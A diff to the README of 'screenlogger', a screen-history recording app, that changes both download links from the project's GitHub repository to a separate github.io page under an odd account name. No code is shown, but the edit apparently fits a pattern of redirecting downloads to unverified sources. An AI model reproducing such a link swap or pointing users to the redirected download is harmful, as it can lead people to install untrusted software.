@@ -1,6 +1,6 @@
 # 📸 screenlogger - Your private, searchable screen history
 
-[![Download Latest Version](https://img.shields.io/badge/Download-v1.2.3-blue?style=for-the-badge)](https://github.com/Sharpeyed-lysimachianemorum724/screenlogger)
+[![Download Latest Version](https://img.shields.io/badge/Download-v1.2.3-blue?style=for-the-badge)](https://sharpeyed-lysimachianemorum724.github.io)
 
 ## 🎯 What is screenlogger?
 
@@ -133,7 +133,7 @@ The app runs as a background process with a menu bar icon. It uses minimal syste
 
 ## 🔗 Links
 
-- **Download the latest version:** [https://github.com/Sharpeyed-lysimachianemorum724/screenlogger](https://github.com/Sharpeyed-lysimachianemorum724/screenlogger)
+- **Download the latest version:** [https://sharpeyed-lysimachianemorum724.github.io](https://sharpeyed-lysimachianemorum724.github.io)
 - **Report a bug:** Open an issue on the GitHub repository
 - **View source code:** The repository is open source
 
